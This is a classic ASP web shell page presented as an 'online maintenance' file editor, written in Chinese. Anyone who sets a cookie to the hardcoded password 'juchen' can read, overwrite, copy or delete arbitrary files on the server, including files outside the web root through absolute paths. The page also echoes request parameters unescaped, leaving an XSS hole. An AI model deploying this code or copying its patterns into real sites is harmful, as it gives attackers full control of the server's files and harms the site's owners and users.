<html>

<head>
<meta HTTP-EQUIV="Content-Type" CONTENT="text/html;charset=gb_2312-80">
<title>编辑源代码</title>
<style>
<!--
table{ font-family: 宋体; font-size: 12pt }
a{ font-family: 宋体; font-size: 12pt; color: rgb(0,32,64); text-decoration: none }
a:hover{ font-family: 宋体; color: rgb(255,0,0); text-decoration: underline }
a:visited{ color: rgb(128,0,0) }
-->
</style>
</head>

<body>
<% '读文件
if Request.Cookies("password")="juchen" then 
if request("op")="del"  then
if Request("attrib")="true" then
whichfile=Request("path")
else
whichfile=server.mappath(Request("path"))
end if 
Set fs = CreateObject("Scripting.FileSystemObject")
Set thisfile = fs.GetFile(whichfile)
thisfile.Delete True
Response.write "<b>删除成功</b>！要刷新才能看到效果，你可以<a href='javascript:window.close();'>关闭本窗口</a>了"
else
if request("op")="copy" then
if Request("attrib")="true" then
whichfile=Request("path")
dsfile=Request("dpath")
else
whichfile=server.mappath(Request("path"))
dsfile=Server.MapPath(Request("dpath"))
end if 
Set fs = CreateObject("Scripting.FileSystemObject")
Set thisfile = fs.GetFile(whichfile)
thisfile.copy dsfile
Response.write "<p><b>源文件：</b>"+whichfile
Response.write "<b><br>目的文件：</b>"+dsfile
Response.write "<br><b>复制成功！要刷新才能看到效果，</b>你可以<a href='javascript:window.close();'>关闭本窗口</a>了</p>"
else
if request.form("text")="" then
if Request("creat")<>"yes" then
if Request("attrib")="true" then
whichfile=Request("path")
else
whichfile=server.mappath(Request("path"))
end if 
Set fs = CreateObject("Scripting.FileSystemObject")
 Set thisfile = fs.OpenTextFile(whichfile, 1, False)
 counter=0
 thisline=htmlencode2(thisfile.readall)
 thisfile.Close
 set fs=nothing
end if
%>

<form method="POST" action="edit.asp">
  <input type="hidden" name="attrib" value="<%=Request("attrib")%>"><table border="0"
  width="700" cellpadding="0">
    <tr>
      <td width="100%" bgcolor="#FFDBCA"><div align="center"><center><p>【在线维护】</td>
    </tr>
    <tr align="center">
      <td width="100%" bgcolor="#FFDBCA">文件名：<input type="text" name="path" size="45"
      value="<%=Request("path")%> ">直接更改文件名，相当于“另存为”</td>
    </tr>
    <tr align="center">
      <td width="100%" bgcolor="#FFDBCA"><textarea rows="25" name="text" cols="90"><%=thisline%></textarea></td>
    </tr>
    <tr align="center">
      <td width="100%" bgcolor="#FFDBCA"><div align="center"><center><p><input type="submit"
      value="提交" name="B1"><input type="reset" value="复原" name="B2"></td>
    </tr>
  </table>
</form>
<%else
if Request("attrib")="true" then
whichfile=Request("path")
else
whichfile=server.mappath(Request("path"))
end if 
 Set fs = CreateObject("Scripting.FileSystemObject")
 Set outfile=fs.CreateTextFile(whichfile)
 outfile.WriteLine Request("text")
 outfile.close 
 set fs=nothing
Response.write "修改成功！你可以<a href='javascript:window.close();'>关闭本窗口,刷新即可看到</a>了"
end if
end if
end if
else
response.write "对不起!你的密码已经失效或者你输错了密码，请返回重输"
response.write "<a href='index.asp'>【返 回】</a>"
end if

function htmlencode2(str)
 dim result
 dim l
 if isNULL(str) then 
 htmlencode2=""
 exit function
 end if
 l=len(str)
 result=""
	dim i
	for i = 1 to l
	 select case mid(str,i,1)
	 case "<"
	 result=result+"&lt;"
	 case ">"
	 result=result+"&gt;"
	 case chr(34)
	 result=result+"&quot;"
	 case "&"
	 result=result+"&amp;"
	 case else
	 result=result+mid(str,i,1)
 end select
 next 
 htmlencode2=result
end function
%>
</body>
</html>




